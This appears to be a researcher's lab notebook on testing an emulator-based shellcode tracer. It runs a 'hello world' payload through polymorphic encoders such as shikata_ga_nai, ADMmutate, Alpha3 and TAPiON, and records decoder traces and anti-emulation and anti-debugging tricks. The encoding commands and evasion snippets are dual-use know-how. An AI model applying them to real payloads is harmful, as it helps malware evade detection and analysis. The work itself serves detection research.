Or just treat each instruction as a block


---7 March
 >> oTBS pc: 0xbfadb810
 >> oTIE pc: 0xbfadb810:0x00 nextpc: bfadb812 len: 2
!!* pc != prev insn's next_pc; 0xbfadb810 != bfadb811
  1  2B @0xbfadb810:*da d4                              fcmovbe st0, st4         nextPC: 0xbfadb812
 >> oTIE pc: 0xbfadb812:0x02 nextpc: bfadb817 len: 5
  2  5B @0xbfadb812: b8 92 ba 1e 5c                     mov eax, 0x5c1eba92      nextPC: 0xbfadb817
 >> oTBE Target by pc: 0xbfadb817 to pc: 0xbfadb817
 >> oTIE pc: 0xbfadb817:0x07 nextpc: bfadb81b len: 4
  3  4B @0xbfadb817: d9 74 24 f4                        fnstenv [esp-0xc]        nextPC: 0xbfadb81b
 >> oTIE pc: 0xbfadb81b:0x0b nextpc: bfadb81c len: 1
  4  1B @0xbfadb81b: 5b                                 pop ebx                  nextPC: 0xbfadb81c
 >> oTIE pc: 0xbfadb81c:0x0c nextpc: bfadb81e len: 2
  5  2B @0xbfadb81c: 29 c9                              sub ecx, ecx             nextPC: 0xbfadb81e
 >> oTIE pc: 0xbfadb81e:0x0e nextpc: bfadb820 len: 2
  6  2B @0xbfadb81e: b1 0b                              mov cl, 0xb              nextPC: 0xbfadb820
 >> oTIE pc: 0xbfadb820:0x10 nextpc: bfadb823 len: 3
  7  3B @0xbfadb820: 83 c3 04                           add ebx, 0x4             nextPC: 0xbfadb823
 >> oTIE pc: 0xbfadb823:0x13 nextpc: bfadb826 len: 3
  8  3B @0xbfadb823: 31 43 14                           xor [ebx+0x14], eax      nextPC: 0xbfadb826
 >> oTIE pc: 0xbfadb826:0x16 nextpc: bfadb829 len: 3
  9  3B @0xbfadb826: 03 43 86                           add eax, [ebx-0x7a]      nextPC: 0xbfadb829
 >> oTIE pc: 0xbfadb829:0x19 nextpc: bfadb82a len: 1
 10  1B @0xbfadb829: 58                                 pop eax                  nextPC: 0xbfadb82a
 >> oTBE Target by pc: 0xbfadb82a to pc: 0xbfadb7e3
 >> oTIE pc: 0xbfadb82a:0x1a nextpc: ffffffff len: 1079134165
 11  2B @0xbfadb82a: eb b7                              jmp 0xffffffffffffffb9   nextPC: 0xbfadb7e3
 >> oExc pc: 0xbfadb810 exception_idx: 239
 >> oPC prev: 3 curr: 0
 >> oPC prev: 0 curr: 3
 >> oEI pc: 0xbfadb810
 >> oEI pc: 0xbfadb812
 >> oEI pc: 0xbfadb817
 >> oEI pc: 0xbfadb81b
 >> oEI pc: 0xbfadb81c
 >> oEI pc: 0xbfadb81e
 >> oEI pc: 0xbfadb820
 >> oPF addr: 0x00000018 iswrite: 0
 >> oExc pc: 0xbfadb823 exception_idx: 14

Note that exception_idx: 239 is "coprocessor not found," and oPF addr is 0x18. This seems to mean that ebx is set to 0x0 bc the getPC doesn't work here. Verify ebx value. See if we can fudge this getPc?


------12 AMrch
./rangedxorencode.pl -i ../ByteArrays/hw.rawshell -o rangedxorencode.rawshell -f 10 -l 20 -k 0xff
MAde ranged xor encoder. Tried to make overlapping and separate enclosed shells, but it failed. Needs further investigation.

add eax, [ebx+0x14] 


The following is the output of our system running sganai at the point where the xor overwrites the next insn
>> Write to previously translated insn! at pc 0xbfd84938
 >> oDMA Write by seq_num: 7 pc: 0xbfd84933:0x13 to addr: 0xbfd84938 len: 4B value:  0x14  0xe2  0xf5  0xeb 
 >> >> oDMA value in memory at that address:  0x14  0xe2  0xf5  0xeb 
 >> oEI pc: 0xbfd84933
  7:  8: 2  3B @0xbfd84933: 31 43 14                           xor [ebx+0x14], eax      nextPC: 0xbfd84936
 >> DEBUG: oEI retranslate triggered at pc 0xbfd84933
 >> oExc pc: 0xbfd84936 exception_idx: 239(0xef)
 >> oPC prev: 3 curr: 0
 >> oPC prev: 0 curr: 3
 >> oTBS pc: 0xbfd84936
 >> oTIE pc: 0xbfd84936:0x16 nextpc: bfd84939 len: 3
!!* pc != prev insn's next_pc; 0xbfd84936 != bfd848f3
  0: 12: 3  3B @0xbfd84936: 03 43 14                           add eax, [ebx+0x14]      nextPC: 0xbfd84939
 >> oTBE Target by pc: 0xbfd84939 to pc: 0xbfd8493b
 >> oTBE Target by pc: 0xbfd84939 to pc: 0xbfd84930
 >> oTIE pc: 0xbfd84939:0x19 nextpc: bfd84930 len: 2
  0: 13: 3  2B @0xbfd84939: e2 f5                              loop 0xfffffffffffffff7  nextPC: 0xbfd84930
 >> oEI pc: 0xbfd84936
  8: 12: 3  3B @0xbfd84936: 03 43 14                           add eax, [ebx+0x14]      nextPC: 0xbfd84939
 >> oEB pc: 0xbfd84939
 >> oEI pc: 0xbfd84939
  9: 13: 3  2B @0xbfd84939: e2 f5                              loop 0xfffffffffffffff7  nextPC: 0xbfd84930
 >> oExc pc: 0xbfd84930 exception_idx: 239(0xef)



----------2 May 2013
CLET
./clet/clet -S ../ByteArrays/hw.rawshell -d > hw-clet.rawshell
./PrintShell.sh hw-clet.rawshell -x


ADMmutate expects a NOP sled in the beginning...
echo `perl -e 'print "A"x200'` > admm-in.rawshell
cat ../ByteArrays/hw.rawshell >> admm-in.rawshell
Had to modify the source to not care about a retaddr (no strstr if conditional, no apply_offset_mod), also added file output of result to admm-out.rawshell (which I copied to ByteArrays/hw-admm.rawshell)
cat admm-in.rawshell | ./ADMmutate-0.8.4/m7 -i  -o 0x000000C8 -n 0x41  
// note that -o is unused by the program, but non zero value needed to pass argument verification
The final jump was short by 1, manually incremented its value with hexedit


Alpha2
Alpha2 expects the getPC to already be done. Our wrapper puts the base addr into EAX, so leverage that.
cat ../../ByteArrays/hw.rawshell | ./alpha2 eax > ../hw-alpha2.rawshell


TAPiON http://pb.specialised.info/all/tapion/
wine tapion2.exe ../../../ByteArrays/hw.rawshell R 1
--------------------------------------------------------------------
TAPiON2 (ver. 0.1c) Polymorphic Decryptor Generator
by Piotr Bania <bania.piotr@gmail.com>
http://pb.specialised.info
--------------------------------------------------------------------

[+] Garbage step is randomized!
[+] Using jump garbaging
[+] Trying to open ../../../ByteArrays/hw.rawshell
[+] Readen 41 bytes
[+] Using long jump!
[+] Crypting block 0032d630 with db85ff8b as key
[+] Crypting block 0032d62e with db85ff8b as key
[+] Crypting block 0032d62c with db85ff8b as key
[+] Crypting block 0032d62a with db85ff8b as key
[+] Crypting block 0032d628 with db85ff8b as key
[+] Crypting block 0032d626 with db85ff8b as key
[+] Crypting block 0032d624 with db85ff8b as key
[+] Crypting block 0032d622 with db85ff8b as key
[+] Crypting block 0032d620 with db85ff8b as key
[+] Crypting block 0032d61e with db85ff8b as key
[+] Crypting block 0032d61c with db85ff8b as key
[+] Crypting block 0032d61a with db85ff8b as key
[+] Crypting block 0032d618 with db85ff8b as key
[+] Crypting block 0032d616 with db85ff8b as key
[+] Crypting block 0032d614 with db85ff8b as key
[+] Crypting block 0032d612 with db85ff8b as key
[+] Crypting block 0032d610 with db85ff8b as key
[+] Crypting block 0032d60e with db85ff8b as key
[+] Crypting block 0032d60c with db85ff8b as key
[+] Crypting block 0032d60a with db85ff8b as key
[+] Crypting block 0032d608 with db85ff8b as key
[+] The decryptor body was generated!
[+] Decryptor body size = 288 bytes
[+] Shellcode size = 41 bytes
[+] Decryptor + Shellcode size = 329 bytes
[+] Magic byte is 8B
[+] Crypto steping = 2 byte(s)
[+] Pass steping = 0 byte(s)
[+] Shellcode dumped to ../../../ByteArrays/hw.rawshell.tapion_bin
[+] Written 334 bytes
[+] Shellcode header stored to ../../../ByteArrays/hw.rawshell.tapion_bin.h


Shikata Ga Nai
encode the default: msfencode -c 1 -i msfe-in.rawshell -t raw -o msfe-out-sganai.rawshell -v -e x86/shikata_ga_nai
http://www.debasish.in/2011/10/encoding-your-handmade-shell-code-using.html
See 'man 7 undocumented' for help when manual pages are not available.
[s2e@s2e:~/s2e]$ msfencode -h

    Usage: /opt/metasploit/apps/pro/msf3/msfencode <options>

OPTIONS:

    -a <opt>  The architecture to encode as
    -b <opt>  The list of characters to avoid: '\x00\xff'
    -c <opt>  The number of times to encode the data
    -d <opt>  Specify the directory in which to look for EXE templates
    -e <opt>  The encoder to use
    -h        Help banner
    -i <opt>  Encode the contents of the supplied file path
    -k        Keep template working; run payload in new thread (use with -x)
    -l        List available encoders
    -m <opt>  Specifies an additional module search path
    -n        Dump encoder information
    -o <opt>  The output file
    -p <opt>  The platform to encode for
    -s <opt>  The maximum size of the encoded data
    -t <opt>  The output format: raw,ruby,rb,perl,pl,bash,sh,c,js_be,js_le,java,dll,exe,exe-small,exe-only,elf,macho,vba,vba-exe,vbs,loop-vbs,asp,aspx,war,psh,psh-net
    -v        Increase verbosity
    -x <opt>  Specify an alternate executable template

[s2e@s2e:~/s2e/dasos/ObfuscationTesting]$ msfencode -l -a x86

Framework Encoders (architectures: x86)
=======================================

    Name                          Rank       Description
    ----                          ----       -----------
    generic/none                  normal     The "none" Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder


I want to be able to run: bloxor, call4_dword_xor, countdown, fnstenv_mov, jmp_call_additive, shikata_ga_nai. Possibly also context_cpuid/stat/time

msfencode -i ../ByteArrays/hw.rawshell -b '\x00' -t raw -e x86/countdown -o hw-countdown.rawshell
msfencode -i ../ByteArrays/hw.rawshell -b '\x00' -t raw -e x86/bloxor -o hw-bloxor.rawshell
msfencode -i ../ByteArrays/hw.rawshell -b '\x00' -t raw -e x86/call4_dword_xor -o hw-call4dword.rawshell
msfencode -i ../ByteArrays/hw.rawshell -b '\x00' -t raw -e x86/fnstenv_mov -o hw-fnstenv_mov.rawshell
msfencode -i ../ByteArrays/hw.rawshell -b '\x00' -t raw -e x86/jmp_call_additive -o hw-jmpcall.rawshell


Anti-emulation techniques: (http://hackforums.forumotion.net/t28-malware-analysis-anti-debugging-anti-emulation)
Made testers for: undocumented SALC insn; SAL; test alternate imm encoding (the byte values given in link did not execute, but nasm's assembled values for test with imm did run fine).
SAL tester had to be hand coded:
31 C0    xor eax, eax ; eax = 0
B0 01    mov al, 1    ; eax = 1
C0 F0 01 sal al, 1    ; shift arithmetic left (sometimes ignored by emus bc assemblers never generate it bc equiv to SHL); eax = 2
CD 80    int 80       ; syscall (2) or 1 if sal not implemented




Other methods to try out later on (as time allows)
Call fn twice and make sure it returns two different values (if it should, like time)
push offset handler
push dword ptr fs:[0]
mov fs:[0],esp
rdtsc
push eax
xor eax, eax
div eax ;trigger exception
rdtsc
sub eax, [esp] ;ticks delta
add esp, 4
pop fs:[0]
add esp, 4
cmp eax, 10000h ;threshold
jb @not_debugged
@debugged:
...
@not_debugged:
...
handler:
mov ecx, [esp+0Ch]
add dword ptr [ecx+0B8h], 2 ;skip div
xor eax, eax
ret

Using coprocessor FPU instructions is another way to overextend the emulator because most emulators do not emulate the FPU instructions.
Prizzy polymorphic engine (PPE) can generate 43 different coprocessor instructions for the use of its polymorphic decryptor.
If these FPU instructions are not provided, the decryption on Prizzy does not execute.
MMX and FPU
MMX and FPU registers are overlapping, but in opposite directions: 0, 1,2,3... mapped to 7,6,5...
Thus, a single FPU operation on st0 will modify fst, st0, but also mm7 (and cr0, under XP).
d9eb: fldpi
=> fst = 03800h
   st0 = 04000c90fdaa22168c235h
   mm7 =     0c90fdaa22168c235h
   cr0 = 080010031h (under XP)

aad
aad is officially defined to use only 10/0Ah as a default operand, but can just use any other operand.
it makes it the first Add and Multiply opcode, as al = ah * operand + al.
66B8 2503; mov ax 325 ax = 325h
D507; aad 7
=> ax = 3 * 7 + 25h = 3ah
aam
Similar logic for aam:
it's officially defined with 10/0ah, but it just works with any byte.
it's a division, and quotient and remainder go to ah and al respectively.
B0 3A; mov al, 3A al = 3ah
d403;  aam 3
=> ah = 3ah / 3 = 13h
   al = 3ah % 3 = 1

str/sldt
Like smsw, they work on DWORD or WORD on registers, but only on WORD in memory.
   0f 00c8: str eax
=> eax = 00000028h (XP)
66 0f 00c8: str ax
=> ax  =     0028h (XP)
   0f 0008: str [eax]
=> word ptr [eax] = 0028h (XP)
it's the same for sldt.



found Alpha3. Had to chmod755 *.py, run dos2unix (strip EOL), remove test from loaded modules and its reference at about line 238.
cat ../../ByteArrays/hw.rawshell | ./ALPHA3.py x86 ascii mixedcase eax > hw-alpha3.rawshell
 >> oTBS pc: 0xbff1cbf0
 >> oTIE pc: 0xbff1cbf0:0x00 nextpc: bff1cbf5 len: 5
  0:  0: 1  5B @0xbff1cbf0: 68 66 66 66 66                     push dword 0x66666666    nextPC: 0xbff1cbf5
 >> oTIE pc: 0xbff1cbf5:0x05 nextpc: bff1cbf9 len: 4
  0:  1: 1  4B @0xbff1cbf5: 6b 34 64 69                        imul esi, [esp], 0x69    nextPC: 0xbff1cbf9
 >> oPF addr: 0x3fd545e8 iswrite: 0
[State 1] CPU dump
EAX=0xbff1cbf0
EBX=0x0
ECX=0xbff1c1e8
EDX=0xb7764340
ESI=0x400e3410
EDI=0x0
EBP=0xbff1c658
ESP=0xbff1c1f8
EIP=0xbff1cbf5
CR2=0x3fd545e8

esi = [esp] * 0x69 = [0x66666666]*0x69


BloXor:
https://github.com/pwnieexpress/metasploit-framework/blob/master/lib/rex/encoder/bloxor/bloxor.rb
      # Generate the decoder stub which is functionally equivalent to the following:
      #
      #  source  = &end;
      #  dest    = source + BLOCK_SIZE;
      #  counter = BLOCK_COUNT * ( BLOCK_SIZE / chunk_size );
      #  do
      #  {
      #     encoded = *(CHUNK_SIZE *)dest;
      #     dest += chunk_size;
      #     decoded = *(CHUNK_SIZE *)source;
      #     *(CHUNK_SIZE *)source = decoded ^ encoded;
      #     source += chunk_size;
      #  } while( --counter );
      #
      #  end:

>> Printing Exec_Trace (instructions in order of execution)
>>      0:  0: 1  5B @0xbfc19cb0: e8 ff ff ff ff                     call 0x4                 nextPC: 0xbfc19cb4   getPC onto stack
>>      1:  1: 2  2B @0xbfc19cb4: ff c0                              inc eax                  nextPC: 0xbfc19cb6   junk
>>      2:  2: 2  1B @0xbfc19cb6: 59                                 pop ecx                  nextPC: 0xbfc19cb7   ecx=PC=0x..b5
>>      3:  3: 2  2B @0xbfc19cb7: 6a 05                              push 0x5                 nextPC: 0xbfc19cb9   
>>      4:  4: 2  1B @0xbfc19cb9: 5b                                 pop ebx                  nextPC: 0xbfc19cba   ebx=0x5
>>      5:  5: 2  2B @0xbfc19cba: 29 d9                              sub ecx, ebx             nextPC: 0xbfc19cbc   ecx=-ebx=0x..b5-0x5=0x..b0
>>      6:  6: 2  2B @0xbfc19cbc: 6a 4d                              push 0x4d                nextPC: 0xbfc19cbe   
>>      7:  7: 2  3B @0xbfc19cbe: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cc1   ecx=+0x4d=0x..fd
>>      8:  8: 2  1B @0xbfc19cc1: 5b                                 pop ebx                  nextPC: 0xbfc19cc2   ebx=0x4d
>>      9:  9: 2  2B @0xbfc19cc2: 89 cf                              mov edi, ecx             nextPC: 0xbfc19cc4   edi=ecx=0x..fd
>>     10: 10: 2  2B @0xbfc19cc4: 6a 02                              push 0x2                 nextPC: 0xbfc19cc6
>>     11: 11: 2  3B @0xbfc19cc6: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cc9   edi+=0x2=0x..ff
>>     12: 12: 2  1B @0xbfc19cc9: 5b                                 pop ebx                  nextPC: 0xbfc19cca   ebx=0x..fd <- obs_sc[0]
>>     13: 13: 2  2B @0xbfc19cca: 6a 15                              push 0x15                nextPC: 0xbfc19ccc   
>>     14: 14: 2  1B @0xbfc19ccc: 5e                                 pop esi                  nextPC: 0xbfc19ccd   esi=0x15 <- counter
begin loop (counted 21 (0x15) times)
>>     15: 15: 2  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0   edx=[0x..ff] <- obs_sc[2]
>>     16: 16: 2  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>     17: 17: 2  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5   edi+=0x2=0x.101 <-obs_sc[4]
>>     18: 18: 2  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6   ebx=0x2
>>     19: 19: 2  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8   push 4B of obs_sc[0]
>>     20: 20: 2  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9   eax = obs_sc
>>     21: 21: 2  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc   lob off left 2B
>>     22: 22: 2  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf   correct 2B location
>>     23: 23: 2  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1   ebx=eax=obs_sc[0..1]
>>     24: 24: 2  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3   ebx=sc[0..1]|sc[2..5]
>>     25: 25: 2  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5   eax=sc[0..1]&sc[2..5]
>>     26: 26: 2  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7   eax=!(eax)
>>     27: 27: 2  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9   eax=(!(sc[0..1]&sc[2..5]))&(sc[0..1]|sc[2..5]) = (!(x&y)&(x|y))
>>     28: 28: 2  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb   ax holds decoded i, i+1
>>     29: 29: 3  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee   <- writes i, i+1
>>     30: 30: 3  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>     31: 31: 3  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3   ecx+=0x2=0x..ff
>>     32: 32: 3  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4   ebx=0x2
>>     33: 33: 3  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5   dec counter
>>     34: 34: 3  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7 end loop, if 0 don't jump
>>     35: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>     36: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>     37: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>     38: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>     39: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>     40: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>     41: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>     42: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>     43: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>     44: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>     45: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>     46: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>     47: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>     48: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>     49: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>     50: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>     51: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>     52: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>     53: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>     54: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>     55: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>     56: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>     57: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>     58: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>     59: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>     60: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>     61: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>     62: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>     63: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>     64: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>     65: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>     66: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>     67: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>     68: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>     69: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>     70: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>     71: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>     72: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>     73: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>     74: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>     75: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>     76: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>     77: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>     78: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>     79: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>     80: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>     81: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>     82: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>     83: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>     84: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>     85: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>     86: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>     87: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>     88: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>     89: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>     90: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>     91: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>     92: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>     93: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>     94: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>     95: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>     96: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>     97: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>     98: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>     99: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    100: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    101: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    102: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    103: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    104: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    105: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    106: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    107: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    108: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    109: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    110: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    111: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    112: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    113: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    114: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    115: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    116: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    117: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    118: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    119: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    120: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    121: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    122: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    123: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    124: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    125: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    126: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    127: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    128: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
